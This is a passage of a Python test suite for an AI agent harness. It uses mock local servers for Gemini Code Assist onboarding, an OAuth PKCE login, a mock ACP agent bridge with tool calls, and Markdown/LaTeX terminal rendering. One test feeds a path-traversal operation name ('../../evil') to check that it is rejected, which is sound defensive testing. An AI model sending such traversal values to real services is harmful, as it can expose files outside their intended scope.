                            "currentTier": {"id": "standard-tier", "userDefinedCloudaicompanionProject": True},
                            "ineligibleTiers": [
                                {
                                    "tierId": "free-tier",
                                    "reasonCode": "DASHER_USER",
                                    "reasonMessage": "Workspace accounts require a project",
                                }
                            ],
                        }
                    raw = json.dumps(resp_obj).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self.wfile.write(raw)
                    return

                if self.path == "/v1internal:onboardUser":
                    ca_state["onboard_bodies"].append(body)
                    if ca_state["mode"] == "managed_org_needs_onboard":
                        raw = json.dumps(
                            {
                                "done": True,
                                "response": {"cloudaicompanionProject": {"id": "managed-org-proj-55"}},
                            }
                        ).encode("utf-8")
                    else:
                        raw = json.dumps({"name": "operations/onboard-op-99", "done": False}).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self.wfile.write(raw)
                    return

                if self.path == "/v1internal:retrieveUserQuota":
                    raw = json.dumps(
                        {
                            "buckets": [
                                {"modelId": "gemini-3.1-pro-preview", "remainingFraction": 0.99, "resetTime": "2026-12-01T00:00:00Z"},
                                {"modelId": "gemini-3.8-flash", "remainingFraction": 1.0, "resetTime": "2026-12-01T00:00:00Z"},
                                {"modelId": "unreset_placeholder", "remainingFraction": 1.0},
                            ]
                        }
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self.wfile.write(raw)
                    return

                if self.path == "/v1internal:streamGenerateContent?alt=sse":
                    if body.get("model") == "vertex-only-404-model":
                        err_raw = json.dumps(
                            {"error": {"code": 404, "message": "Requested entity was not found.", "status": "NOT_FOUND"}}
                        ).encode("utf-8")
                        self.send_response(404)
                        self.send_header("Content-Type", "application/json")
                        self.send_header("Content-Length", str(len(err_raw)))
                        self.end_headers()
                        self.wfile.write(err_raw)
                        return
                    sse = (
                        "data: "
                        + json.dumps(
                            {
                                "response": {
                                    "candidates": [
                                        {
                                            "content": {"role": "model", "parts": [{"text": f"ULTRA_OK:{body.get('project')}"}]},
                                            "finishReason": "STOP",
                                        }
                                    ]
                                }
                            }
                        )
                        + "\n\n"
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(sse)
                    return

                self.send_response(404)
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), _ZeroProjectCAHandler)
        base = f"http://127.0.0.1:{srv.server_address[1]}"
        th = threading.Thread(target=srv.serve_forever, daemon=True)
        th.start()
        try:
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
                os.environ, {"USH_DISABLE_KEYCHAIN": "1"}, clear=False
            ):
                root = pathlib.Path(tmp)
                vault = CredentialVault(root / "ush", probe_ambient=False)

                # 10a. Already-onboarded Google AI Ultra account (zero GCP project!)
                s_ultra = setup_code_assist_user("ya29.ultra", base_url=base)
                self.assertEqual(s_ultra.project_id, "managed-ultra-proj-001")
                self.assertEqual(s_ultra.tier_name, "Google AI Ultra")
                self.assertTrue(s_ultra.has_paid_tier)
                self.assertEqual(s_ultra.google_one_credits, 2500)
                self.assertFalse(s_ultra.project_id_required)

                # 10b. First-time onboarding via `:onboardUser` + LRO polling (`GET /v1internal/operations/...`)
                ca_state["mode"] = "first_time_onboard"
                s_onb = setup_code_assist_user(
                    "ya29.ultra",
                    base_url=base,
                    poll_interval_seconds=0.0,
                    sleep_fn=lambda _: None,
                )
                self.assertEqual(s_onb.project_id, "managed-ultra-proj-777")
                self.assertEqual(ca_state["lro_polls"], 2)
                # Free/managed tier onboarding MUST NOT send `cloudaicompanionProject`
                self.assertNotIn("cloudaicompanionProject", ca_state["onboard_bodies"][0])

                # 10c. Path traversal operation name in LRO polling is strictly rejected
                with mock.patch.object(urllib.request, "urlopen") as m_open:
                    resp_load = mock.MagicMock()
                    resp_load.__enter__.return_value.read.return_value = b'{"allowedTiers":[{"id":"free-tier","isDefault":true}]}'
                    resp_onb = mock.MagicMock()
                    resp_onb.__enter__.return_value.read.return_value = b'{"name":"operations/../../evil","done":false}'
                    m_open.side_effect = [resp_load, resp_onb]
                    with self.assertRaises(ValueError):
                        setup_code_assist_user("ya29.x", base_url="http://127.0.0.1:9", sleep_fn=lambda _: None)

                # 10d. Corporate `DASHER_USER` without companion project surfaces `project_id_required=True`
                ca_state["mode"] = "dasher_corp"
                s_corp = setup_code_assist_user("ya29.corp", base_url=base)
                self.assertTrue(s_corp.project_id_required)
                self.assertEqual(s_corp.project_id, "")
                self.assertTrue(any("DASHER_USER" in r for r in s_corp.ineligible_reasons))

                # 10e. Managed-org account with `cloudaicompanionProject` + `allowedTiers` + `currentTier=None`
                # MUST still call `:onboardUser` with `cloudaicompanionProject` + `metadata.duetProject`
                ca_state["mode"] = "managed_org_needs_onboard"
                s_morg = setup_code_assist_user("ya29.morg", base_url=base, sleep_fn=lambda _: None)
                self.assertEqual(s_morg.project_id, "managed-org-proj-55")
                self.assertFalse(s_morg.project_id_required)
                last_onb = ca_state["onboard_bodies"][-1]
                self.assertEqual(last_onb.get("tierId"), "standard-tier")
                self.assertEqual(last_onb.get("cloudaicompanionProject"), "managed-org-proj-55")
                self.assertEqual(last_onb.get("metadata", {}).get("duetProject"), "managed-org-proj-55")

                # 10f. Full loopback browser PKCE callback (ignoring stray `/favicon.ico`) + native `antigravity` stream_turn
                ca_state["mode"] = "first_time_onboard"
                ca_state["lro_polls"] = 0

                def _simulate_browser(auth_url: str) -> bool:
                    parsed_u = urllib.parse.urlparse(auth_url)
                    qs = urllib.parse.parse_qs(parsed_u.query)
                    redir = (qs.get("redirect_uri") or [""])[0]
                    st = (qs.get("state") or [""])[0]
                    cb_base = redir.rsplit("/", 1)[0]

                    def _fire() -> None:
                        # Hit `/favicon.ico` first to verify callback server ignores non-callback paths
                        try:
                            urllib.request.urlopen(f"{cb_base}/favicon.ico", timeout=2).close()
                        except urllib.error.HTTPError as he:
                            he.close()
                        with urllib.request.urlopen(
                            f"{redir}?code=loopback_code_777&state={urllib.parse.quote(st)}", timeout=5
                        ) as r_cb:
                            assert r_cb.headers.get("Content-Security-Policy") == "default-src 'none'"
                            _ = r_cb.read()

                    threading.Thread(target=_fire, daemon=True).start()
                    return True

                # Store Desktop OAuth client credentials in `0600` vault and verify resolver
                vault.store_secret(
                    "__google_oauth_client__",
                    mock.MagicMock(
                        to_json=lambda: json.dumps(
                            {"client_id": "installed_app_cid.apps.googleusercontent.com", "client_secret": "installed_app_csec"}
                        )
                    ),
                )
                self.assertEqual(
                    resolve_google_oauth_client_credentials(vault),
                    ("installed_app_cid.apps.googleusercontent.com", "installed_app_csec"),
                )

                # Patch `secure_ssl_context` -> `None` ONLY for local HTTP test token endpoint
                with contextlib.redirect_stdout(io.StringIO()), mock.patch(
                    "ush.auth.vault.webbrowser.open", side_effect=_simulate_browser
                ), mock.patch("ush.auth.vault.secure_ssl_context", return_value=None):
                    oauth_prof = run_oauth_pkce_login(
                        vault,
                        profile_name="antigravity",
                        provider="antigravity",
                        authorize_url=f"{base}/oauth2/auth",
                        token_url=f"{base}/oauth2/token",
                        client_id="installed_app_cid.apps.googleusercontent.com",
                        client_secret="installed_app_csec",
                        scopes=["https://www.googleapis.com/auth/cloud-platform"],
                        base_url=base,
                        redirect_path="/oauth2callback",
                        api_mode="code_assist",
                        project_id=None,
                    )

                # Stream a turn with `provider="antigravity"` & `project_id=None` -> auto-onboards via LRO & streams!
                oauth_prof.default_model = "gemini-3.1-pro-preview"
                mprof = resolve_model_profile("gemini-3.1-pro-preview", "antigravity")
                reply = HttpProviderTransport(vault).stream_turn(
                    profile=mprof,
                    auth_profile=oauth_prof,
                    system_prompt="sys",
                    messages=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hello ultra")])],
                    tools=[],
                    session_id="sess_ultra_01",
                )
                self.assertEqual(reply.plain_text(), "ULTRA_OK:managed-ultra-proj-777")

                # 10g. Live `retrieveUserQuota` model discovery + automatic 404 fallback on `cloudcode-pa`
                from ush.auth.vault import fetch_code_assist_quota_models

                q_models = fetch_code_assist_quota_models(
                    base, project_id="managed-ultra-proj-777", token="ya29.ultra_oauth_access"
                )
                self.assertEqual([m for m, _ in q_models], ["gemini-3.1-pro-preview", "gemini-3.8-flash"])
                events: list[Any] = []
                fb_reply = HttpProviderTransport(vault).stream_turn(
                    profile=resolve_model_profile("vertex-only-404-model", "antigravity"),
                    auth_profile=oauth_prof,
                    system_prompt="sys",
                    messages=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hello fallback")])],
                    tools=[],
                    session_id="sess_ultra_02",
                    on_event=events.append,
                )
                self.assertEqual(fb_reply.plain_text(), "ULTRA_OK:managed-ultra-proj-777")
                self.assertEqual(fb_reply.producer_model_id, "gemini-3.1-pro-preview")
                self.assertTrue(any(e.meta and e.meta.get("event") == "model_fallback" for e in events))
        finally:
            srv.shutdown()
            srv.server_close()
            th.join(timeout=2)

    # =========================================================================
    # 11. Antigravity ACP Dynamic Models (`Gemini 4 Argon`), Streaming & Tools
    # =========================================================================

    def test_agy_acp_dynamic_models_streaming_and_tool_bridge(self) -> None:
        from ush.auth.vault import (
            discover_model_options,
            fetch_vertex_publisher_models,
            login_antigravity_acp,
        )
        from ush.brain.agy_acp import (
            AgyAcpBridge,
            ToolCallTagStreamSplitter,
            close_all_agy_bridges,
            parse_agy_models_cli_output,
            resolve_acp_variant_id,
        )
        from ush.core.types import ThinkingEffort
        from ush.kernel.tools import build_default_tool_registry

        # 11a. 1-byte streaming `<tool_call>` splitter never leaks raw XML into visible prose
        sp = ToolCallTagStreamSplitter()
        raw_stream = 'Checking file.\n<tool_call>{"name": "read_file", "arguments": {"path": "x.txt"}}</tool_call>Done!'
        emitted = "".join(sp.feed(ch) for ch in raw_stream) + sp.flush()
        self.assertEqual(emitted, "Checking file.\nDone!")

        # 11b. `agy models` CLI parser strips ANSI spinners & groups effort variants into clean display names
        sample_cli = (
            "\r⠋ Fetching available models...\r"
            "gemini-4-argon-high      Gemini 4 Argon (High)\n"
            "gemini-4-argon-medium    Gemini 4 Argon (Medium)\n"
            "gemini-4-argon-low       Gemini 4 Argon (Low)\n"
            "gemini-3.8-flash-high    Gemini 3.8 Flash (High)\n"
            "gemini-3.7-flash-high    Gemini 3.7 Flash (High)\n"
            "gemini-3.6-flash-high    Gemini 3.6 Flash (High)\n"
            "gemini-3.1-pro-low       Gemini 3.1 Pro (Low)\n"
            "gemini-3.1-pro-high      Gemini 3.1 Pro (High)\n"
        )
        parsed_opts = parse_agy_models_cli_output(sample_cli)
        self.assertEqual(
            [(o.model_id, o.display_name) for o in parsed_opts],
            [
                ("gemini-4-argon", "Gemini 4 Argon"),
                ("gemini-3.8-flash", "Gemini 3.8 Flash"),
                ("gemini-3.7-flash", "Gemini 3.7 Flash"),
                ("gemini-3.6-flash", "Gemini 3.6 Flash"),
                ("gemini-3.1-pro", "Gemini 3.1 Pro"),
            ],
        )
        v_set = {vid for o in parsed_opts for vid in o.variant_ids}
        self.assertEqual(resolve_acp_variant_id("gemini-4-argon", ThinkingEffort.HIGH, v_set, parsed_opts), "gemini-4-argon-high")
        self.assertEqual(resolve_acp_variant_id("Gemini 4 Argon", ThinkingEffort.LOW, v_set, parsed_opts), "gemini-4-argon-low")
        # `gemini-3.1-pro` only has low/high -> MEDIUM gracefully selects `gemini-3.1-pro-high`
        self.assertEqual(resolve_acp_variant_id("gemini-3.1-pro-preview", ThinkingEffort.MEDIUM, v_set, parsed_opts), "gemini-3.1-pro-high")

        # 11c. Full end-to-end mock `agy acp` stdio server + `SessionRunner` 2-step ReAct tool execution
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            ws = root / "ws"
            home = root / "home"
            ws.mkdir()
            (ws / "secret_num.txt").write_text("ARGON_MAGIC_7331\n", encoding="utf-8")

            mock_agy = root / "mock_agy.py"
            mock_agy.write_text(
                "#!/usr/bin/env python3\n"
                "import json, sys\n"
                "if len(sys.argv) > 1 and sys.argv[1] == 'models':\n"
                "    print('gemini-4-argon-high  Gemini 4 Argon (High)')\n"
                "    sys.exit(0)\n"
                "step = 0\n"
                "cur_model = 'gemini-4-argon-high'\n"
                "for line in sys.stdin:\n"
                "    obj = json.loads(line)\n"
                "    rid = obj.get('id')\n"
                "    m = obj.get('method')\n"
                "    if m == 'initialize':\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {'protocolVersion': 1}}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/new':\n"
                "        res = {\n"
                "            'sessionId': 'acp_sess_1',\n"
                "            'models': {\n"
                "                'currentModelId': cur_model,\n"
                "                'availableModels': [\n"
                "                    {'modelId': 'gemini-4-argon-high', 'name': 'Gemini 4 Argon (High)'},\n"
                "                    {'modelId': 'gemini-3.8-flash-high', 'name': 'Gemini 3.8 Flash (High)'},\n"
                "                ],\n"
                "            },\n"
                "            'configOptions': [{\n"
                "                'id': 'model',\n"
                "                'currentValue': 'gemini-4-argon',\n"
                "                'options': [\n"
                "                    {'value': 'gemini-4-argon', 'name': 'Gemini 4 Argon'},\n"
                "                    {'value': 'gemini-3.8-flash', 'name': 'Gemini 3.8 Flash'},\n"
                "                ],\n"
                "            }],\n"
                "        }\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': res}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/set_model':\n"
                "        cur_model = obj['params']['modelId']\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {}}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/prompt':\n"
                "        step += 1\n"
                "        sid = obj['params']['sessionId']\n"
                "        # Verify unexpected permission request from server is auto-cancelled by bridge\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': 999, 'method': 'session/request_permission', 'params': {}}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "        perm_reply = json.loads(sys.stdin.readline())\n"
                "        assert perm_reply['result']['outcome']['outcome'] == 'cancelled'\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'method': 'session/update', 'params': {\n"
                "            'sessionId': sid,\n"
                "            'update': {'sessionUpdate': 'agent_thought_chunk', 'content': {'type': 'text', 'text': f'Thinking step {step}'}}\n"
                "        }}) + '\\n')\n"
                "        if step == 1:\n"
                "            txt = 'Let me check.<tool_call>{\"name\": \"read_file\", \"arguments\": {\"path\": \"secret_num.txt\"}}</tool_call>'\n"
                "        else:\n"
                "            p_txt = json.dumps(obj['params']['prompt'])\n"
                "            assert 'ARGON_MAGIC_7331' in p_txt and '<crux_system_instructions>' not in p_txt\n"
                "            txt = f'Found secret via {cur_model}: ARGON_MAGIC_7331'\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'method': 'session/update', 'params': {\n"
                "            'sessionId': sid,\n"
                "            'update': {'sessionUpdate': 'agent_message_chunk', 'content': {'type': 'text', 'text': txt}}\n"
                "        }}) + '\\n')\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {\n"
                "            'stopReason': 'end_turn',\n"
                "            'usage': {'inputTokens': 120, 'outputTokens': 30, 'cachedReadTokens': 80, 'thoughtTokens': 15}\n"
                "        }}) + '\\n')\n"
                "        sys.stdout.flush()\n",
                encoding="utf-8",
            )
            os.chmod(mock_agy, 0o700)

            with mock.patch.dict(
                os.environ,
                {"USH_HOME": str(home), "USH_DISABLE_KEYCHAIN": "1", "CRUX_AGY_BIN": str(mock_agy)},
                clear=False,
            ):
                try:
                    vault = CredentialVault(home, probe_ambient=False)
                    prof = login_antigravity_acp(vault, profile_name="antigravity", run_login_if_needed=False)
                    self.assertEqual(prof.default_model, "gemini-4-argon")
                    self.assertEqual(prof.api_mode, "agy_acp")

                    opts = discover_model_options(vault, prof)
                    self.assertEqual(
                        [(o.model_id, o.display_name) for o in opts],
                        [("gemini-4-argon", "Gemini 4 Argon"), ("gemini-3.8-flash", "Gemini 3.8 Flash")],
                    )

                    streamed_visible: list[str] = []
                    streamed_thoughts: list[str] = []

                    def _collect(ev: Any) -> None:
                        if ev.kind == "text_delta":
                            streamed_visible.append(ev.text)
                        elif ev.kind == "thinking_delta":
                            streamed_thoughts.append(ev.text)

                    runner = SessionRunner(
                        workspace_root=ws,
                        client=UniversalModelClient(vault, HttpProviderTransport(vault)),
                        auth_profile=prof,
                        model_profile=resolve_model_profile("gemini-4-argon", "antigravity"),
                        mode=PermissionMode.AUTO_EDIT,
                        tools=build_default_tool_registry(),
                        ush_home=home,
                    )
                    try:
                        outcome = runner.run_turn("Read secret_num.txt and report it", on_event=_collect)
                        self.assertEqual(outcome.steps_executed, 2)
                        self.assertIn("ARGON_MAGIC_7331", outcome.final_message.plain_text())
                        self.assertNotIn("<tool_call>", "".join(streamed_visible))
                        self.assertIn("Thinking step 1", "".join(streamed_thoughts))
                    finally:
                        runner.close()
                finally:
                    close_all_agy_bridges()

        # 11d. Live `v1beta1/publishers/google/models` parser orders Gemini 4 Argon first & filters non-chat models
        vtx_srv = ThreadingHTTPServer(
            ("127.0.0.1", 0),
            type(
                "_VtxPubHandler",
                (BaseHTTPRequestHandler,),
                {
                    "log_message": lambda *a: None,
                    "do_GET": lambda h: (
                        h.send_response(200),
                        h.send_header("Content-Type", "application/json"),
                        h.end_headers(),
                        h.wfile.write(
                            json.dumps(
                                {
                                    "publisherModels": [
                                        {"name": "publishers/google/models/gemini-2.5-flash", "displayName": "Gemini 2.5 Flash"},
                                        {"name": "publishers/google/models/gemini-3.8-flash-tts", "displayName": "TTS"},
                                        {"name": "publishers/google/models/gemini-4-argon", "displayName": "Gemini 4 Argon"},
                                        {"name": "publishers/google/models/gemini-3.8-flash", "displayName": "Gemini 3.8 Flash"},
                                    ]
                                }
                            ).encode("utf-8")
                        ),
                    ),
                },
            ),
        )
        vtx_th = threading.Thread(target=vtx_srv.serve_forever, daemon=True)
        vtx_th.start()
        try:
            v_host = f"http://127.0.0.1:{vtx_srv.server_address[1]}"
            v_models = fetch_vertex_publisher_models(v_host, token="ya29.test")
            self.assertEqual(
                v_models,
                [
                    ("gemini-4-argon", "Gemini 4 Argon"),
                    ("gemini-3.8-flash", "Gemini 3.8 Flash"),
                    ("gemini-2.5-flash", "Gemini 2.5 Flash"),
                ],
            )
        finally:
            vtx_srv.shutdown()
            vtx_srv.server_close()
            vtx_th.join(timeout=2)

    # =========================================================================
    # 12. Readable Terminal Markdown Renderer (Streaming, Tables, Code & Links)
    # =========================================================================

    def test_terminal_markdown_streaming_tables_links_and_code_blocks(self) -> None:
        from ush.cli.markdown import MarkdownStreamRenderer, render_markdown_ansi
        from ush.cli.tui import strip_ansi, vis_width

        doc = (
            "# Architecture Overview\n\n"
            "## Dynamic Runtime Discovery\n\n"
            "Updated [`AgyAcpBridge`](file:///Users/alice/Universal_Swarm_Harness/src/ush/brain/agy_acp.py#L401-L497) "
            "and [tui.py](file:///Users/alice/Universal_Swarm_Harness/src/ush/cli/tui.py#L1317) "
            "while preserving `snake_case_vars`, `__init__`, and math `2 * 3 * 4`.\n\n"
            "- [x] **Streaming Markdown** with `inline_code` inside bold\n"
            "- [ ] Pending follow-up check\n"
            "  - Nested bullet item\n\n"
            "| Model | Pipe Rule | Tokens |\n"
            "| :--- | :---: | ---: |\n"
            "| `Gemini 4 Argon` | `a | b` | 1,000,000 |\n"
            "| Gemini 3.8 Flash | fast | 1,000,000 |\n\n"
            "> [!TIP]\n"
            "> Press `/model` to switch models cleanly.\n\n"
            "```python\n"
            "def greet(user_name: str) -> str:\n"
            "    # Keep exact indentation\n"
            "    return f\"hello {user_name}\"\n"
            "```\n"
        )

        # 12a. Full render vs 1-character streaming MUST be byte-for-byte identical!
        full_ansi = render_markdown_ansi(doc, use_color=True, width=84)
        stream_md = MarkdownStreamRenderer(use_color=True, cols_fn=lambda: 84)
        chunks: list[str] = []
        for ch in doc:
            committed, preview = stream_md.feed(ch)
            if committed:
                chunks.append(committed)
            for pl in preview:
                # Every live preview line must have self-contained ANSI and bounded width
                self.assertLessEqual(vis_width(pl), 84)
        tail = stream_md.flush()
        if tail:
            chunks.append(tail)
        streamed_ansi = "".join(chunks).rstrip("\n")
        self.assertEqual(streamed_ansi, full_ansi)

        plain = strip_ansi(full_ansi)
        # Raw Markdown noise stripped
        self.assertNotIn("## Dynamic", plain)
        self.assertNotIn("```python", plain)
        self.assertNotIn("file:///Users/alice", plain)
        self.assertNotIn("[!TIP]", plain)
        # Readable formatted elements present
        self.assertIn("Architecture Overview", plain)
        self.assertIn("◆ Dynamic Runtime Discovery", plain)
        self.assertIn("AgyAcpBridge (agy_acp.py:401-497)", plain)
        self.assertIn("tui.py:1317", plain)
        self.assertIn("snake_case_vars", plain)
        self.assertIn("__init__", plain)
        self.assertIn("2 * 3 * 4", plain)
        self.assertIn("✓ Streaming Markdown", plain)
        self.assertIn("○ Pending follow-up check", plain)
        self.assertIn("╭─", plain)
        self.assertIn("│ Gemini 4 Argon   │", plain)
        self.assertIn("a | b", plain)  # Pipe inside inline code did NOT split the table cell!
        self.assertIn("◆ Tip", plain)
        self.assertIn("╭─ python", plain)
        self.assertIn("│ def greet(user_name: str) -> str:", plain)

    def test_latex_math_special_chars_entities_and_font_safety(self) -> None:
        from ush.cli.markdown import (
            MarkdownStreamRenderer,
            normalize_terminal_math_glyphs,
            render_latex_math,
            render_markdown_ansi,
        )
        from ush.cli.tui import strip_ansi

        doc = (
            "Inline math: $\\alpha + \\beta \\leq \\gamma$, $x_{i+1} = x_i - \\eta \\nabla f(x_i)$, "
            "$w^\\top x + b \\neq 0$, $\\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}$, and $\\frac{1}{2} mv^2$.\n\n"
            "Paren & bracket delimiters: \\( \\theta \\in \\mathbb{R}^d \\) and \\[ \\sum_{i=1}^{n} x_i^2 \\approx \\int_0^\\infty e^{-t}\\,dt \\].\n\n"
            "Prose LaTeX & HTML entities: Let \\lambda \\rightarrow 0 &mdash; then A &le; B &rarr; C &ne; D.\n\n"
            "Plane-1 SMP & Menlo-missing normalization: 𝒪(N log N), 𝑥 ∈ ℝ, xₙ, ‖w‖₂, ℏ, A ⟶ B.\n\n"
            "Currency, env vars & code stay untouched: It costs $10 and $25 ($USH_HOME/$PATH), "
            "path C:\\alpha\\to\\file, and code `$\\alpha + \\beta$`.\n\n"
            "| Norm | Bound |\n"
            "| :--- | :--- |\n"
            "| $|x|$ | $\\|w\\|_2 \\le 1$ |\n\n"
            "$$\n"
            "\\begin{aligned}\n"
            "\\mathcal{L}(\\theta) &= \\frac{1}{N} \\sum_{i=1}^{N} (y_i - \\hat{y}_i)^2 \\\\\n"
            "f(x) &= \\begin{cases} x^2 & \\text{if } x \\ge 0 \\\\ -x & \\text{otherwise} \\end{cases}\n"
            "\\end{aligned}\n"
            "$$\n\n"
            "```latex\n"
            "\\frac{\\alpha}{\\beta}\n"
            "```\n"
        )

        # Full render vs 1-char streaming MUST match identically even across multi-line `$$...$$` blocks!
        full_ansi = render_markdown_ansi(doc, use_color=True, width=108)
        stream_md = MarkdownStreamRenderer(use_color=True, cols_fn=lambda: 108)
        streamed_parts: list[str] = []
        for ch in doc:
            c, _ = stream_md.feed(ch)
            if c:
                streamed_parts.append(c)
        tail = stream_md.flush()
        if tail:
            streamed_parts.append(tail)
        self.assertEqual("".join(streamed_parts).rstrip("\n"), full_ansi)

        plain = strip_ansi(full_ansi)
        # 1. Inline & delimiter math rendered into clean Unicode
        self.assertIn("α + β ≤ γ", plain)
        self.assertIn("xᵢ₊₁ = xᵢ - η ∇ f(xᵢ)", plain)
        self.assertIn("wᵀ x + b ≠ 0", plain)
        self.assertIn("(-b ± √(b² - 4ac))/(2a)", plain)
        self.assertIn("½ mv²", plain)
        self.assertIn("θ ∈ ℝᵈ", plain)
        self.assertIn("∑ᵢ₌₁ⁿ xᵢ² ≈ ∫₀^∞ e⁻ᵗ dt", plain)

        # 2. Un-delimited prose LaTeX + HTML entities
        self.assertIn("λ → 0 — then A ≤ B → C ≠ D", plain)

        # 3. Plane-1 SMP (`0x1D400..0x1D7FF`) & Menlo-missing subscripts (`xₙ`, `‖w‖₂`) normalized
        self.assertIn("O(N log N)", plain)
        self.assertIn("x ∈ ℝ", plain)
        self.assertIn("x_n", plain)
        self.assertIn("||w||₂", plain)
        self.assertIn("ħ", plain)
        self.assertIn("A → B", plain)
        for ch in plain:
            self.assertFalse(0x1D400 <= ord(ch) <= 0x1D7FF, f"Leaked Plane-1 tofu char {ch!r} ({hex(ord(ch))})")
            self.assertNotIn(ch, "ₕₖₗₘₙₚₛₜ‖⟶⟵⟷")

        # 4. Currency, shell vars, Windows paths & code fences/spans untouched!
        self.assertIn("It costs $10 and $25 ($USH_HOME/$PATH)", plain)
        self.assertIn("C:\\alpha\\to\\file", plain)
        self.assertIn("$\\alpha + \\beta$", plain)  # Inside inline backticks!
        self.assertIn("│ \\frac{\\alpha}{\\beta}", plain)  # Inside ```latex code fence!

        # 5. Table cell with `$|x|$` and `$\|w\|_2 \le 1$` did NOT split on `|`!
        self.assertIn("|x|", plain)
        self.assertIn("||w||₂ ≤ 1", plain)

        # 6. Multi-line `$$ \begin{aligned} ... $$` block rendered cleanly without raw `$$` or `\begin`
        self.assertNotIn("$$", plain)
        self.assertNotIn("\\begin{aligned}", plain)
        self.assertIn("1/N ∑ᵢ₌₁ᴺ", plain)
        self.assertIn("ŷᵢ", plain)

        # 7. Matrix rendering in display mode
        mat = render_latex_math(r"\begin{bmatrix} 1 & 0 \\ 0 & \lambda \end{bmatrix}", display=True, use_color=False)
        self.assertIn("⎡ 1  0 ⎤", mat)
        self.assertIn("⎣ 0  λ ⎦", mat)
        self.assertEqual(normalize_terminal_math_glyphs("𝑥ₙ", use_color=False), "x_n")

    # =========================================================================
    # 13. Multi-Turn ACP Session Reuse & Tail-Safe Cold Hydration (`<=135k` chars)
    # =========================================================================

    def test_agy_acp_multi_turn_session_reuse_and_tail_safe_cold_hydration(self) -> None:
        from ush.auth.vault import login_antigravity_acp
        from ush.brain.agy_acp import (
            MAX_ACP_PROMPT_CHARS,
            ToolCallTagStreamSplitter,
            _blocks_char_len,
            _build_bounded_cold_prompt_blocks,
            close_all_agy_bridges,
        )
        from ush.brain.context_dag import build_deterministic_epistemic_summary
        from ush.brain.wire import wrap_dynamic_instructions

        # 13a. `<crux_tool_call>` + `agy` malformed-call warning banner are stripped on 1-char boundaries
        sp = ToolCallTagStreamSplitter()
        noisy_stream = (
            "Analyzing a < b.\n"
            "⚠ Your previous response contained an improperly formatted function call\nRetries remaining: 3\n"
            '<crux_tool_call>{"name": "read_file", "arguments": {"path": "cfg.txt"}}</crux_tool_call>'
            "Clean prose!"
        )
        vis_out = "".join(sp.feed(c) for c in noisy_stream) + sp.flush()
        self.assertEqual(vis_out, "Analyzing a < b.\nClean prose!")

        # 13b. Deterministic epistemic summary keeps BOTH Turn-1 objective and latest user turns (never drops >Turn 4)
        twelve_turns = [
            CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text=f"USER_GOAL_TURN_{i:02d}")])
            for i in range(1, 13)
        ]
        epi = build_deterministic_epistemic_summary(twelve_turns)
        self.assertIn("USER_GOAL_TURN_01", epi)
        self.assertIn("USER_GOAL_TURN_12", epi)
        self.assertIn("USER_GOAL_TURN_11", epi)

        # 13c. Live multi-turn reuse across `<dynamic_instructions>`, quoted assistant tags, read tombstoning, `/btw` & `/model`
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp).resolve()
            ws = root / "ws"
            home = root / "home"
            skill_dir = root / "skills" / "eval-kit"
            ws.mkdir()
            skill_dir.mkdir(parents=True)
            # Large >512-byte target file so `tombstone_superseded_reads` activates on duplicate `read_file`!
            (ws / "spec.txt").write_text("SPEC_HEADER_v1\n" + ("line_payload_alpha_beta_gamma\n" * 30), encoding="utf-8")
            (skill_dir / "SKILL.md").write_text(
                "---\nname: eval-kit\ndescription: Evaluator harness plugin benchmark\n---\nUse evaluator plugins.\n",
                encoding="utf-8",
            )
            rpc_log = root / "acp_rpc_log.jsonl"
            mock_agy = root / "mock_agy_multi.py"
            mock_agy.write_text(
                "#!/usr/bin/env python3\n"
                "import json, pathlib, sys\n"
                f"log_path = pathlib.Path({str(rpc_log)!r})\n"
                "sess_seq = 0\n"
                "step = 0\n"
                "cur_model = 'gemini-4-argon-high'\n"
                "for line in sys.stdin:\n"
                "    obj = json.loads(line)\n"
                "    rid = obj.get('id')\n"
                "    m = obj.get('method')\n"
                "    with log_path.open('a', encoding='utf-8') as lf:\n"
                "        lf.write(json.dumps({'method': m, 'params': obj.get('params')}) + '\\n')\n"
                "    if m == 'initialize':\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {'protocolVersion': 1}}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/new':\n"
                "        sess_seq += 1\n"
                "        res = {\n"
                "            'sessionId': f'acp_live_{sess_seq}',\n"
                "            'models': {\n"
                "                'currentModelId': cur_model,\n"
                "                'availableModels': [\n"
                "                    {'modelId': 'gemini-4-argon-high', 'name': 'Gemini 4 Argon (High)'},\n"
                "                    {'modelId': 'gemini-3.8-flash-high', 'name': 'Gemini 3.8 Flash (High)'},\n"
                "                ],\n"
                "            },\n"
                "            'configOptions': [{\n"
                "                'id': 'model',\n"
                "                'currentValue': 'gemini-4-argon',\n"
